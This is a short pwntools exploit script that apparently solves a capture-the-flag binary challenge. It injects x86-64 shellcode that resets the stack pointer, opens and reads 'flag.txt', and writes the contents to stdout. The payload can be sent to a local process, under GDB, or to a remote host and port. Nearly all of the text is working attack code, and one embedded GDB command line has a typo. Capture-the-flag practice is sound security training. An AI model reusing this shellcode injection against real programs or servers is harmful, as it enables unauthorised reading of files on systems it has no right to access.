#!/usr/bin/python3
from pwn import *

script = """
b *main+309
continue
"""

# Switch between local/GDB/remote from terminal 
def initIO():
    if (args.GDB):
        return gdb.debug(ELF.path, gdbscript=script)
    if (args.REMOTE):   # ("server", port)
        return remote(sys.argv[1], sys.argv[2])
    else:               # Run locally
        return ELF.process()

# Set up the correct architecture for pwn
file = "./chall"
# Get context arch, bits, os, etc.
ELF = context.binary = ELF(file, checksec=False)
# Enable verbose logging
context.log_level = "debug"
context.terminal = "kitty"

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

payload = flat(
    asm("mov rsp, QWORD PTR FS:[0]"),
    asm(shellcraft.open(".")),
    # asm(shellcraft.getdents("rax", "rsp", 0x100)),
    asm(shellcraft.open("flag.txt")),
    asm(shellcraft.read("rax", "rsp", 0x100)),
    asm(shellcraft.write(1, "rsp", 0x100))
)

script = f"""
b* main+309
continue < <(python -c "import sys; sys stdout.buffer.write({payload})")
"""

# Start program
io = initIO()

io.sendline(payload)

io.interactive()
